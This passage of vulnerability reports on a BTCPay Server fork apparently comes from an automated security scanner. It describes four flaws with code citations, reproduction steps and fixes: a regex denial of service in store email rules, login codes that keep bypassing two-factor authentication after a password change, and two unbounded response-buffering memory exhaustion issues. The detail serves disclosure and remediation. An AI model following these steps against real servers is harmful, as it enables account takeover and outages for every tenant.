   ValidateCondition is the only write-time check: it executes jsonb_path_exists('{}'::JSONB, @path::jsonpath), which only verifies the jsonpath (and embedded regex) compiles. It does not restrict like_regex, back-references, or evaluation cost, so a pathological condition is accepted and stored for the store.
3. [BTCPayServer/Plugins/Emails/HostedServices/EmailRuleProcessorSender.cs:54–65](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/HostedServices/EmailRuleProcessorSender.cs#L54-L65)
   StoreEmailRuleProcessorSender is the sole subscriber to TriggerEvent (store-level and server-level alike) and awaits GetMatches once per event before anything else, so one slow evaluation holds the whole processor.
4. [BTCPayServer/HostedServices/EventHostedServiceBase.cs:36–78](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/EventHostedServiceBase.cs#L36-L78)
   Events are buffered in one unbounded channel and processed strictly one at a time (await ProcessEvent). Exceptions are caught and logged, but a long-running query is simply awaited, so every subsequent event from every store and the server waits behind it while the backlog grows in memory.
5. [BTCPayServer/Plugins/Emails/Migrations/DefaultServerEmailRulesMigration.cs:14–33](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Migrations/DefaultServerEmailRulesMigration.cs#L14-L33)
   Default server rules for PasswordReset, EmailConfirm, InvitePending, ApprovalRequest etc. are seeded for every installation; these server-level emails are published as TriggerEvents (UserEventTriggerHostedService.cs:62-135) and therefore drain through the same serial queue the attacker stalls, so account recovery and invitation emails for all users are delayed.
6. [BTCPayServer/Plugins/Webhooks/HostedServices/WebhookProviderHostedService.cs:56–61](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/HostedServices/WebhookProviderHostedService.cs#L56-L61)
   Every store webhook event (InvoiceCreated, InvoiceExpired, InvoiceReceivedPayment, ...) is turned into a TriggerEvent carrying the provider's email model and published, so each invoice the attacker creates yields at least one (and on expiry, more) condition evaluations.
7. [BTCPayServer/Plugins/Webhooks/TriggerProviders/InvoiceTriggerProvider.cs:58–78](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/TriggerProviders/InvoiceTriggerProvider.cs#L58-L78)
   AddInvoiceToModel places the entire invoice Metadata object into the model (Invoice.Metadata), so the strings the like_regex runs over are exactly those the store owner supplied at invoice creation.
8. [BTCPayServer/Controllers/GreenField/GreenfieldInvoiceController.cs:169–172](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldInvoiceController.cs#L169-L172)
   POST /api/v1/stores/{storeId}/invoices requires only CanCreateInvoice on the attacker's own store, carries no RateLimitsFilter (the publicinvoices zone is applied only to anonymous PoS/crowdfund/paybutton/Bitpay endpoints), and passes request.Metadata through CreateInvoiceCoreRaw (UIInvoiceController.cs:170-171) with no size cap; Kestrel's body limit is int.MaxValue.
9. [BTCPayServer.Abstractions/Extensions/DbContextOptionsBuilderExtensions.cs:27–32](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Abstractions/Extensions/DbContextOptionsBuilderExtensions.cs#L27-L32)
   The shared DbContext configuration sets no CommandTimeout (Npgsql's default applies) and enables EnableRetryOnFailure(10); if Npgsql's retrying execution strategy treats the command timeout as transient, each stalled evaluation is repeated with back-off, lengthening the per-event stall. Only migration-specific contexts override the timeout.

## Impact
No data is read or altered. Availability: while the attack runs, the single serial TriggerEvent queue shared by every store and by the server's default account emails (password reset, email confirmation, invitations) is held for the duration of each evaluation (up to the DB command timeout, longer if retried), so rule-based email delivery for all tenants and all users' account-recovery emails stop while the attacker sustains a few invoice creations per minute, the unbounded in-memory backlog grows, and a PostgreSQL backend is kept at full CPU. Rated HIGH because a low-privileged tenant can fully and sustainably deny a server-wide function relied upon by every other tenant and by account recovery; it does not affect invoice/payment processing itself.

## Reproduction steps
1. Attacker is any authenticated user who owns or can modify settings of a store (self-registration is open by default; creating a store is unprivileged). Over the network they (1) save an email rule with a back-reference like_regex condition via the store Email Rules UI, which only syntax-checks it; (2) create invoices through the unrate-limited Greenfield endpoint on their own store with a large metadata string. No race, no special configuration (SMTP need not be set up) and no victim interaction are needed; each invoice deterministically triggers the expensive evaluation on the shared database and stalls the server-wide rule processor.

## Recommended fix
1. A tenant-authored jsonpath (including like_regex) is evaluated by the database against tenant-controlled, unbounded input with no bound on evaluation cost. Fix criteria: A store-authored condition must not be able to consume more than a small, fixed amount of database time per event: e.g. reject like_regex (or back-references) in conditions at write time, and/or run GetMatches with a short statement_timeout/command timeout, and/or cap the size of the model (metadata) handed to the jsonpath. Verification: a rule with a back-reference regex and a multi-megabyte metadata string must either be rejected or complete within the enforced bound.
2. The rule processor is one serial queue for all stores, so a slow evaluation for one tenant delays every other tenant's emails. Fix criteria: A slow or failing evaluation for one store must not delay rule processing for other stores: isolate per-store processing (per-store queues or bounded concurrency with per-event timeouts) so that, under the attack above, other stores' trigger emails are still delivered promptly.

---
**Severity:** HIGH
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257645

---

# Login Codes Blazor circuit keeps minting 2FA-bypassing login codes after password change or session revocation

## Details
The Impersonation plugin's 'Login Codes' page (/account/login-codes, UIImpersonationController, policy CanViewProfile) embeds the Blazor Server component UserLoginCode (render-mode ServerPrerendered). The component resolves the principal from AuthenticationStateProvider and authorizes CanImpersonateUser exactly once in OnParametersSetAsync, caches the ApplicationUser in _user, and then a System.Timers.Timer calls GenerateCodeAndStartTimer every 60 s for the life of the circuit (UserLoginCode.razor 54-93). Each call stores a fresh 20-byte random code -> userId in IMemoryCache for 60 s (UserLoginCodeService.Generate); Verify hands the userId to any bearer of the code. POST /login with Method=LoginCode (UIAccountController 185-197, 207-210) sets success=true and bypass2fa=true and reaches RedirectLoginSuccess (483-515), which gates only on UserService.CanLogin (email confirmation, approval, IsDisabled, login extensions) and issues a full Identity.Application cookie via signInManager.SignInAsync — no password, no second factor.

The circuit's principal is fixed when the SignalR connection is authorized (MapBlazorHub().RequireAuthorization(), Startup.cs 376) and is never revalidated: the application uses the framework default ServerAuthenticationStateProvider (AddServerSideBlazor, Startup.cs 202), registers no RevalidatingServerAuthenticationStateProvider or CircuitHandler (none in the repository), and the project's own stamp machinery — SecurityStampValidatorOptions.ValidationInterval = 5 min (Startup.cs 122-125) and BTCPayServerSecurityStampValidator/SecurityStampInvalidator — only runs inside CookieValidatePrincipalContext, i.e. on HTTP requests that carry the cookie. Nothing in the timer loop re-reads authentication state or the security stamp, and nothing binds a code to the stamp current at issuance.

Consequence: after the account owner changes their password (UIManageController.ChangePassword -> UserManager.ChangePasswordAsync, which rotates the security stamp and kills every other cookie session within the 5-minute interval) the already-open Login Codes circuit keeps minting valid codes; each redeemed code creates a brand-new full session for the user. Enrolling TOTP (UIManageController.Authenticator.cs 57-58 sets AuthenticatorEnabled) or FIDO2 does not help either, because the LoginCode path bypasses the second factor by design. Only admin actions that flip a CanLogin input (SetDisabled, un-approve, revoke email confirmation) stop redemption, and nothing in the user's account UI shows the live circuit or lets them revoke it (unlike API keys, the other persistent credential a session can create, which are listed and revocable and yield neither a UI cookie nor a 2FA bypass).

Attack: an attacker who has hijacked a user's browser session (stolen cookie, XSS, briefly unattended logged-in device) opens /account/login-codes and keeps the tab (or a scripted SignalR client with keepalive) alive. When the victim notices and changes their password and/or enables 2FA, the attacker's cookie dies within 5 minutes but the websocket circuit does not; they read the current QR/URL from the still-live page, submit it to POST /login (Method=LoginCode), and are logged in again as the victim with a fresh full cookie, 2FA bypassed — repeatable for as long as the connection is held.

Assumptions (framework, pinned via net10.0 Microsoft.AspNetCore.Components.Server / SignalR, not verified from source here): Blazor Server's default ServerAuthenticationStateProvider receives HttpContext.User at circuit start and is not refreshed while the connection stays up; SignalR's HttpConnectionDispatcherOptions.CloseOnAuthenticationExpiration defaults to false, so an authenticated websocket is not closed when the cookie later becomes invalid (and it keys on ticket expiry, not the security stamp). A dropped connection forces a reconnect through RequireAuthorization, so the window is an uninterrupted connection.

Root cause: a credential-minting component trusts a one-time authorization decision for the lifetime of a long-lived circuit, and the login-code redemption path does not bind codes to the security stamp of the session that produced them.

## Evidence
1. [BTCPayServer/Plugins/Impersonation/UserLoginCode.razor:54–92](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Impersonation/UserLoginCode.razor#L54-L92)
   OnParametersSetAsync resolves the principal from AuthenticationStateProvider and authorizes CanImpersonateUser exactly once, caches the ApplicationUser in _user, then GenerateCodeAndStartTimer starts a System.Timers.Timer whose CountDownTimer callback calls GenerateCodeAndStartTimer again every 60 seconds. Nothing in the loop re-reads authentication state, re-checks the security stamp, or stops when the HTTP session that opened the page has been invalidated; the circuit mints a fresh bearer login code for _user.Id for as long as the SignalR connection stays alive.
2. [BTCPayServer/Plugins/Impersonation/UserLoginCodeService.cs:15–29](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Impersonation/UserLoginCodeService.cs#L15-L29)
   Generate(userId) unconditionally stores a 20-byte random code -> userId mapping in the memory cache for 60 s. The code is a pure bearer credential: Verify returns the userId to whoever presents the code; there is no binding to the issuing session, security stamp, or password.
3. [BTCPayServer/Controllers/UIAccountController.cs:185–211](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L185-L211)
   POST /login with Method=LoginCode: Verify(code) yields the user, success=true and bypass2fa=true, so RedirectLoginSuccess is reached without any password check and without the second-factor step (login codes bypass 2FA by design because they are supposed to originate from an authenticated session).
4. [BTCPayServer/Controllers/UIAccountController.cs:483–514](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L483-L514)
   RedirectLoginSuccess gates only on UserService.CanLogin (approval, confirmed email, disabled, monetization) and then issues a brand-new full Identity.Application cookie via signInManager.SignInAsync. A password change or stamp rotation performed by the account owner in the meantime does not affect this path, so each code redeemed re-establishes complete access.
5. [BTCPayServer/Hosting/Startup.cs:202–206](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L202-L206)
   AddServerSideBlazor() is used with the framework default ServerAuthenticationStateProvider; no RevalidatingServerAuthenticationStateProvider or CircuitHandler is registered anywhere in the repository (rg for 'Revalidating', 'CircuitHandler', 'CloseOnAuthenticationExpiration' finds nothing), so the circuit's principal is fixed at connection time for the lifetime of the circuit.
6. [BTCPayServer/Hosting/Startup.cs:376](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L376)
   MapBlazorHub().RequireAuthorization() authenticates the Identity cookie only when the hub connection is established. Once the websocket is up, cookie revalidation (BTCPayServerSecurityStampValidator) never runs for the circuit; a later invalid cookie only matters if the connection drops and must be renegotiated.
7. [BTCPayServer/Controllers/UIManageController.cs:268–292](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIManageController.cs#L268-L292)
   ChangePassword calls UserManager.ChangePasswordAsync, whose security-stamp rotation (Identity) is the only mechanism this application has for ending a user's other cookie sessions (no explicit 'sign out everywhere' exists; SecurityStampValidatorOptions.ValidationInterval is 5 min at Startup.cs 122-125). The live Login Codes circuit is a session this mechanism never reaches, and the codes it emits recreate full sessions that the new password cannot stop.
8. [BTCPayServer/Services/BTCPayServerSecurityStampValidator.cs:59–70](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/BTCPayServerSecurityStampValidator.cs#L59-L70)
   The project's forced-revalidation mechanism (SecurityStampInvalidator) hooks CookieValidatePrincipalContext, i.e. it only runs on HTTP requests that carry the cookie. It has no effect on an established Blazor circuit, which is why the code-minting loop survives revocation.
9. [BTCPayServer/Plugins/Impersonation/Views/LoginCodes.cshtml:16](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Impersonation/Views/LoginCodes.cshtml#L16)
   The component is rendered (ServerPrerendered) on /account/login-codes, reachable by every user with CanViewProfile, so any hijacked session can open the code generator.

## Impact
The victim's intended remediation (password change, 2FA enrolment, waiting for the security-stamp interval) silently fails: the attacker re-obtains a complete session as the user — stores, invoices, wallets including hot-wallet spending, API-key creation, profile and e-mail changes — and bypasses the newly configured second factor. Confidentiality and integrity of everything the account can reach remain exposed; availability impact is limited to what the account itself can disrupt (store/invoice deletion).

## Reproduction steps
1. Attacker position: holds a hijacked but still-valid cookie session of the victim (stolen cookie, XSS, unattended device) — ordinary user privileges, PR:L. Steps: open /account/login-codes so the Blazor circuit connects and starts the 60 s code loop, then keep the websocket alive (browser tab or scripted SignalR client with keepalive). After the victim rotates their password or enrols 2FA, read the current QR/URL from the still-live page and submit it anonymously to POST /login (Method=LoginCode); a fresh full cookie is issued with the second factor bypassed. No race and no defence to defeat; AT:P because exploitation needs the pre-existing compromised session and an uninterrupted circuit held from before the victim's remediation. Impact is to the victim's account, not the attacker's own, so this is not self-only reach.

## Recommended fix
1. UserLoginCode.razor authorizes once and then mints login codes from a timer for the lifetime of the Blazor circuit; the circuit's principal is never revalidated against the security stamp, so revocation by password change / 2FA enrolment does not stop code issuance. Fix criteria: Code issuance must stop as soon as the issuing session is no longer valid: before each Generate call the component must re-validate the current principal against the user's security stamp (or a revalidating AuthenticationStateProvider / circuit handler must tear the circuit down on stamp change), and codes should carry the stamp so Verify rejects codes minted under a stale stamp. Verification: open /account/login-codes, change the password or enable 2FA from another browser, wait for the next code rotation, and confirm the page stops producing codes and any still-displayed code is rejected by POST /login.
2. The LoginCode redemption path (UIAccountController 185-212, 483-515) trusts any cached code as full proof of possession of an authenticated session and bypasses 2FA, with no binding to the security stamp current at issuance. Fix criteria: Redeeming a login code must fail if the user's security stamp changed after the code was issued (or if 2FA was enabled after issuance), and a successful redemption should be observable to the account owner (e.g. listed as a recent login). Verification: mint a code, rotate the stamp via ChangePassword, present the code — login must be refused.

---
**Severity:** HIGH
**Status:** Open
**Category:** Insufficient session expiration
**CWE:** [CWE-613](https://cwe.mitre.org/data/definitions/613.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257644

---

# Anonymous NFC endpoint buffers unbounded LNURL-withdraw responses from a payer-chosen host

## Details
POST /plugins/NFC (NFCController.SubmitLNURLWithdrawForInvoice) is [AllowAnonymous] and carries no rate-limit zone or antiforgery check. After confirming only that the named invoice is in state New, that its store has the opt-in NfcEnabled flag, and that the invoice carries a BTC-LN or BTC-LNURL payment prompt, it decodes the payer-supplied 'lnurl' with LNURL.LNURL.Parse into an arbitrary absolute http(s) URL and awaits LNURL.LNURL.FetchInformation(uri, tag, httpClient) (NFCController.cs:118) with the LightningLikePayoutHandler clearnet or onion named client. If that response parses as an LNURLWithdrawRequest with a Callback, it issues a second request to the attacker-provided info.Callback through info.SendRequest (NFCController.cs:210-211). Both named clients are registered (BTCPayServerServices.cs:400-403) with only an SSRF ConnectCallback or a SOCKS proxy; nothing in the tree sets HttpClient.MaxResponseContentBufferSize (default int.MaxValue) or a shorter Timeout (default 100 s), and the controller neither streams nor caps the body. The SSRF guard only rejects private/local addresses, so any public host passes.

Dependency assumptions (not verifiable in the checkout): LNURL 0.0.36's LNURL.FetchInformation and LNURLWithdrawRequest.SendRequest read the response body to a string through the supplied HttpClient (GetStringAsync / ReadAsStringAsync, or GetAsync with the default ResponseContentRead completion), which buffers the whole body up to MaxResponseContentBufferSize. .NET 10 BCL: a declared Content-Length sizes the buffer up front; without one the buffer grows as bytes arrive, so the attacker's server need only stream data for up to 100 s per request.

Attacker: an anonymous payer (threat-model adversaries 1/5). Preconditions: a store with Lightning or LNURL configured and NfcEnabled turned on, and the id of any New invoice of that store (invoice ids appear in every public checkout URL /i/{invoiceId}, and anyone can create one on a public PoS or payment request). The attacker hosts a public HTTPS endpoint that answers with a very large Content-Length and a slow body, or simply streams gigabytes, encodes its URL as bech32 LNURL and fires N concurrent POSTs {invoiceId, lnurl}. With no rate limit, authentication or concurrency bound on the endpoint, N requests yield N attacker-sized buffers each held for up to 100 s.

Impact: memory exhaustion of the single BTCPay process serving every tenant's checkout, UI and API (OOM-kill on an uncapped host, OutOfMemoryException under a cgroup limit). This is an attacker-sized allocation driven by specific input across the anonymous boundary, the same class as the verified webhook-sender-unbounded-response-buffering and bitpay-ipn-sender-unbounded-response-buffering, but reachable without any account.

The same inline FetchInformation pattern in LightningLikePayoutHandler.ParseClaimDestination/GetMinimumPayoutAmount (LightningLikePayoutHandler.cs:84,169) uses the same uncapped named clients for anonymous pull-payment payees; its availability impact is recorded as pull-payment-actor-blocked-by-payee-lnurl-fetch and the same response-size cap belongs there.

## Evidence
1. [BTCPayServer/Plugins/NFC/NFCController.cs:114–128](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/NFC/NFCController.cs#L114-L128)
   LNURL.LNURL.FetchInformation(uri, tag, httpClient) (line 118) is awaited inline in the anonymous request with the payer-decoded uri and a named HttpClient that has no response-size cap or shortened timeout; the whole response body is read into memory before any validation of its content. Primary sink; the fix must bound this read.
2. [BTCPayServer/Plugins/NFC/NFCController.cs:53–68](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/NFC/NFCController.cs#L53-L68)
   [AllowAnonymous] [IgnoreAntiforgeryToken] POST with no RateLimitsFilter; the only gates are that the invoice exists in state New and the store blob has NfcEnabled (opt-in, DefaultValue(false) in StoreBlob.cs:241-243). Neither identifies or throttles the caller.
3. [BTCPayServer/Plugins/NFC/NFCController.cs:94–112](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/NFC/NFCController.cs#L94-L112)
   request.Lnurl is decoded with LNURL.LNURL.Parse (bech32 LNURL or lnurlw:// form) to an arbitrary absolute http(s) URL; the only check is that the tag, if present, is withdrawRequest, so the payer chooses the destination host. The SSRF guard rejects only private addresses, so any public attacker host passes.
4. [BTCPayServer/Plugins/NFC/NFCController.cs:208–218](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/NFC/NFCController.cs#L208-L218)
   A second fully buffered GET is issued via info.SendRequest (line 211) to info.Callback, a URL supplied by the attacker's first response, using a client from the same uncapped named registrations (line 210).
5. [BTCPayServer/Plugins/NFC/NFCController.cs:229–234](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/NFC/NFCController.cs#L229-L234)
   CreateHttpClient returns the LightningLikePayoutHandler onion or clearnet named client depending only on whether the host ends in .onion.
6. [BTCPayServer/Hosting/BTCPayServerServices.cs:400–403](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L400-L403)
   The two named clients are registered with only a Socks5HttpClientHandler (onion) or UseSSRFProtection (a ConnectCallback that filters destination addresses). Neither registration, nor any ConfigureHttpClientDefaults in the tree, sets HttpClient.MaxResponseContentBufferSize or Timeout, so the .NET defaults (int.MaxValue bytes, 100 s) govern how much each anonymous request may buffer.

## Impact
Process-wide memory exhaustion of the single BTCPay Server process (all tenants, all surfaces: checkout, UI, Greenfield API); no confidentiality or integrity effect.

## Reproduction steps
1. An anonymous attacker obtains a New invoice id of an NFC-enabled Lightning store (visible in any public checkout URL; creatable on a public PoS), stands up a public HTTPS server that returns a multi-GB body or a huge Content-Length with a slow body, bech32-encodes its URL and POSTs {invoiceId, lnurl} to /plugins/NFC concurrently. Each request makes BTCPay buffer the attacker-sized response for up to 100 s; no authentication, antiforgery token, rate-limit zone or concurrency bound stands in the way. AT:PRESENT because NfcEnabled is an opt-in store setting (DefaultValue(false)) and the invoice must carry a Lightning/LNURL payment prompt.

## Recommended fix
1. NFCController hands an uncapped, default-timeout HttpClient to LNURL.FetchInformation and LNURLWithdrawRequest.SendRequest for payer-chosen URLs, so the remote server dictates how much memory BTCPay allocates per anonymous request. Fix criteria: Responses from payer/payee-supplied LNURL endpoints (NFC controller and the LightningLikePayoutHandler named clients) must be bounded to a small fixed size (e.g. MaxResponseContentBufferSize of a few KB, or ResponseHeadersRead with a length-limited read) and a short timeout; a server returning a 100 MB body or a huge Content-Length must cause the request to fail without allocating more than the cap.
2. The anonymous POST /plugins/NFC endpoint has no rate-limit zone or concurrency bound, so an attacker can multiply the per-request cost without limit. Fix criteria: The endpoint is placed behind a rate-limit zone (as the public invoice and PayJoin endpoints are) or a per-invoice/per-client concurrency bound, so that repeated anonymous submissions cannot hold many outbound fetches open at once.

---
**Severity:** HIGH
**Status:** Open
**Category:** Resource exhaustion
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257590

---

# Rate provider responses buffered without size limit; hostile exchange can exhaust server memory

## Details
Every IRateProvider fetches a hard-coded HTTPS exchange endpoint and buffers the complete response body in memory before parsing it, with no bound on its size. Three sink shapes: (1) the ExchangeSharp bridge HttpClientRequestMaker.MakeRequestAsync sends with the default HttpCompletionOption.ResponseContentRead and then `responseString = await response.Content.ReadAsStringAsync()` (HttpClientRequestMaker.cs:138-143) — the caller's cancellation token stored in _cancellationToken is never used, only api.RequestTimeout; (2) Kraken, the default source for USD/EUR/CAD/GBP/CHF (BTCPayServerServices.cs:707-711), uses a named client whose only configuration is `AutomaticDecompression = DecompressionMethods.All` (BTCPayServerServices.cs:768-772), reads `ReadAsStringAsync()` and then `JsonConvert.DeserializeObject<T>` into a JToken DOM (KrakenExchangeRateProvider.cs:186-188), so a small gzip/brotli body is inflated in-process; (3) the 18 hand-made providers (Bitbank, BTCTurk, BareBitcoin, BitcoinKenya, Bitflyer, Bitmynt, Bitnob, Bitpay, Buda, Bylls, CoinDCX, Coinmate, Desiboard, FreeCurrencyRates, HitBTC, Luno, Notbank, Ripio, Yadio) call `_httpClient.GetAsync(url)`/`SendAsync`/`PostAsync` (buffering under ResponseContentRead) followed by `ReadAsAsync<JObject>/<JArray>` which builds a full Newtonsoft DOM, on the unnamed default client from `services.AddHttpClient()` (BTCPayServerServices.cs:104). No provider inspects Content-Length, no HttpClient in the tree sets MaxResponseContentBufferSize (rg over all .cs finds none), and no streaming/size-limited reader is used; the only controls are time-based (RatesHostedService's 20-second token for the background refresh, HttpClient's default 100-second timeout and ExchangeSharp's api.RequestTimeout for inline fetches), which bound duration, not bytes.

Dependency behaviour assumed, not verified from source: .NET 10 HttpClient.MaxResponseContentBufferSize defaults to int.MaxValue (2 GiB) and is applied to the decompressed stream; Microsoft.AspNet.WebApi.Client 6.0.0 ReadAsAsync<T> loads the whole content before deserialising; DigitalRuby.ExchangeSharp 1.2.1 BaseAPI.RequestTimeout defaults to tens of seconds.

The threat model lists rate providers as a malicious external service (adversary 6). An exchange operator, an attacker who has compromised one of the ~25 hard-coded ticker endpoints, or a TLS machine-in-the-middle with a certificate the container trusts (no pinning) can answer the ticker request with a multi-gigabyte body — or, for Kraken, a small compressed bomb that AutomaticDecompression inflates. The response size is set entirely by the attacker; the process allocates a growing buffer plus a UTF-16 string plus a JSON DOM for it. The fetch runs inline on request threads whenever BackgroundFetcherRateProvider's cache is cold or past its 5-minute validity (BackgroundFetcherRateProvider.cs:204-212; RateProviderFactory.cs:77-80) — invoice creation, checkout, the anonymous Bitpay GET /api/rates — and RatesHostedService (scheduled every 30 s) refreshes every provider used in the last day once per minute, so the hostile body is pulled automatically and repeatedly, and after an exception the inline path re-fetches on every request because the cache stays expired. The buffered bytes, string and DOM exceed the memory of a typical BTCPay container, so the process is OOM-killed or starts throwing OutOfMemoryException across unrelated code paths, denying service to every store on the instance, not only those using that exchange.

This is an availability defect only: a hostile provider can already return arbitrary rate values by design, and that is not what is reported here.

## Evidence
1. [BTCPayServer.Rating/Providers/HttpClientRequestMaker.cs:134–143](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Rating/Providers/HttpClientRequestMaker.cs#L134-L143)
   ExchangeSharp-backed providers (binance, poloniex, ndax, bitfinex, okex, coinbasepro): SendAsync with the default ResponseContentRead completion buffers the whole body, then `responseString = await response.Content.ReadAsStringAsync()` materialises it as one string; no Content-Length check, no MaxResponseContentBufferSize, the only bound is the api.RequestTimeout CancellationTokenSource (line 134) which limits time, not size. The constructor's _cancellationToken is never used.
2. [BTCPayServer.Rating/Providers/KrakenExchangeRateProvider.cs:184–188](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Rating/Providers/KrakenExchangeRateProvider.cs#L184-L188)
   Kraken (default source for USD, EUR, CAD, GBP, CHF) sends via the named client and reads `await response.Content.ReadAsStringAsync()` then `JsonConvert.DeserializeObject<T>(stringResult)` into a JToken DOM with no size cap; because the named client enables AutomaticDecompression a small gzip/brotli body is inflated in-process before buffering.
3. [BTCPayServer.Rating/Providers/BitbankRateProvider.cs:24–25](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Rating/Providers/BitbankRateProvider.cs#L24-L25)
   Representative of the 18 hand-made providers (BTCTurk, BareBitcoin, BitcoinKenya, Bitflyer, Bitmynt, Bitnob, Bitpay, Buda, Bylls, CoinDCX, Coinmate, Desiboard, FreeCurrencyRates, HitBTC, Luno, Notbank, Ripio, Yadio): `_httpClient.GetAsync(url, ct)` buffers the entire body under ResponseContentRead and `ReadAsAsync<JObject>` builds a full in-memory DOM, with no size limit.
4. [BTCPayServer/Hosting/BTCPayServerServices.cs:768–772](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L768-L772)
   The Kraken named HttpClient is configured only with `AutomaticDecompression = DecompressionMethods.All` — no MaxResponseContentBufferSize or size-aware handler — so the .NET default of int.MaxValue applies and compressed bodies are inflated before buffering.
5. [BTCPayServer/Hosting/BTCPayServerServices.cs:104](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L104)
   The hand-made providers are registered as singletons taking `HttpClient` (AddRateProvider<T>, line 808-811) and receive the unnamed default client from this bare `services.AddHttpClient()`; no HttpClient anywhere in the tree sets MaxResponseContentBufferSize.
6. [BTCPayServer/Hosting/BTCPayServerServices.cs:707–711](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L707-L711)
   Default rate rules map EUR, USD, CAD, GBP and CHF to kraken, so a fresh store's invoice creation pulls the Kraken ticker through the decompressing, unbounded path.
